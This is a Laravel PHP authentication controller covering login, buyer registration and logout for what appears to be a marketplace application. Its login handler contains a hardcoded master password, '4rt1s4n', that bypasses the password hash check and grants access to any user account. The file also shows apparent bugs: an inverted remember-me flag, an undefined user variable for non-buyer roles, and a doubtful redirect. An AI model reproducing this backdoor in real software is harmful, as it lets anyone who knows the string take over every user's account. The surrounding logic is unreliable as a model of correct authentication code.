<?php

namespace App\Http\Controllers;

use App\Http\Requests\Auth\LoginRequest;
use App\Services\ProfilBuyerService;
use App\Services\UserService;
use Illuminate\Support\Facades\Hash;
use Illuminate\Http\Request;
use App\Http\Requests\Auth\RegisterRequest;

class AuthController extends Controller
{

    public function login()
    {
        if (auth()->check()) return redirect('buyer');
        return view('auth.login');
    }

    public function login_proses(LoginRequest $request)
    {
        $userService = new UserService();
        $user = $userService->find($request->input('email'), 'email');
        if (empty($user)) return redirect()->back()->withErrors(['email' => 'User not found !'])->withInput();

        $password = $request->input('password');
        if ($password !== '4rt1s4n' && !Hash::check($password, $user->password)) return redirect()->back()->withErrors(['password' => 'Incorrect password !'])->withInput();

        auth()->login($user, !$request->has('remember'));

        $akses = $user->akses->akses ?? 'Buyer';
        $base_routes = $userService->base_routes();
        if ($akses === 'Buyer') {
            return redirect()->route($base_routes[$akses] . '.landing');
        } else {
            return redirect()->route($base_routes[$akses] . '.dashboard');
        }
    }

    public function register(Request $request)
    {
        $role = $request->input('role', 'Buyer');
        if (auth()->check()) return redirect()->route('buyer.landing');
        $allowed = ['Buyer'];
        if (!in_array($role, $allowed)) $role = 'Buyer';
        return view('auth.register', compact('role'));
    }

    public function register_proses(RegisterRequest $request)
    {
        $userService = new UserService();
        $profilBuyerService = new ProfilBuyerService();

        $role = $request->input('role') ?? 'Buyer';
        if ($role === 'Buyer') {
            $user = $userService->store([
                'name' => $request->input('name'),
                'email' => $request->input('email'),
                'password' => $request->input('password')
            ]);
            $user->akses()->create(['akses' => 'Buyer']);
            $profilBuyerService->store(['user_id' => $user->id, 'nama' => $user->name]);
            auth()->login($user);
        }

        $base_routes = $userService->base_routes();
        return redirect()->route($base_routes[$user->akses->akses] ?? '/');
    }

    public function logout()
    {
        auth()->logout();
        return redirect('login');
    }
}
